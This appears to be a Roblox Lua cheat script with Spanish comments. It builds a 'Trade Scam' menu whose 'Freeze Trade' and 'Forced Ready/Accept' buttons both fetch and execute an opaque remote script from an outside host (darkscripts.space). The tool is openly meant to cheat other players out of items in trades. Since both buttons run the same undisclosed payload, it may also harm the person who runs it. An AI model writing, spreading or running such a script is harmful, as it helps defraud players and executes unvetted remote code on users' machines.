-- Cargar la librería Orion
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

-- Crear una ventana
local Window = OrionLib:MakeWindow({
    Name = "Scriptarg Trade Scam",  -- Nombre de la ventana
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionHubConfig"
})

-- Crear una pestaña
local Tab = Window:MakeTab({
    Name = "Trade Scam",  -- Nombre de la pestaña cambiado a "Trade Scam"
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Definir la función del script
local function executeScript()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/e2f000f7-c01a-4ae8-b107-4d030c4a8276_1263197110149316610.lua', true))()
end

-- Agregar un botón: Freeze Trade
Tab:AddButton({
    Name = "Freeze Trade",
    Callback = executeScript
})

-- Agregar un botón: Forced Ready/Accept
Tab:AddButton({
    Name = "Forced Ready/Accept",
    Callback = executeScript
})

-- Agregar un botón no interactivo como cartel
Tab:AddButton({
    Name = "Nota: apretar bien los botones y esperar de 3-5 minutos para que funcione",
    Callback = function() end, -- No hace nada
    Interactable = false -- Deshabilitar interacción (cartel)
})

-- Inicializar la interfaz
OrionLib:Init()
